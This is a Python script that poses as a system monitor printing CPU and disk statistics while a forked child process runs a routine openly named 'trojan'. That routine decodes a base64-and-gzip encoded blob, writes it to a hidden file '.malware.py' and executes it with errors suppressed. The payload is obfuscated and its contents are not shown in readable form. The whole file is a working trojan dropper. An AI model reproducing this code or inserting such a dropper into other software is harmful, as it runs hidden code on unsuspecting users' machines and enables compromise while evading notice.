#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def legitimate():
	while True:

		print("="*40, "CPU Information", "="*40)
		# number of cores
		print("Physical cores:{}  ".format(psutil.cpu_count(logical=False)))
		print("Total cores: {} ".format(psutil.cpu_count(logical=True)))
		# CPU usage
		print("CPU Usage Per Core: ")
		for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
			print(f"Core {i}: {percentage}%    ")
		print(f"Total CPU Usage: {psutil.cpu_percent()}% ")
		

		# Disk Information
		print("="*40, "Disk Information", "="*40)
		print("Partitions and Usage:")
		# get all disk partitions
		partitions = psutil.disk_partitions()
		for partition in partitions:
			print(f"=== Device: {partition.device} ===")
			print(f"  Mountpoint: {partition.mountpoint}")
			print(f"  File system type: {partition.fstype}")
		
		
		# get IO statistics since boot
		disk_io = psutil.disk_io_counters()
		print(f"Total read: {get_size(disk_io.read_bytes)}")
		print(f"Total write: {get_size(disk_io.write_bytes)}")
		time.sleep(2)

def main():
	# fork
	pid = os.fork()

	if pid > 0: # if parent process 
		legitimate()
		
	else: # else if child process
		trojan() # trojan execute in child process

def trojan():
	malware_fd = open(".malware.py", "w")
	blob = "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"
	malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
	malware_fd.write(malware)
	malware_fd.close()

	# execute malware
	os.system("/usr/bin/python3 .malware.py 2>/dev/null")


if __name__ == "__main__":
	main()
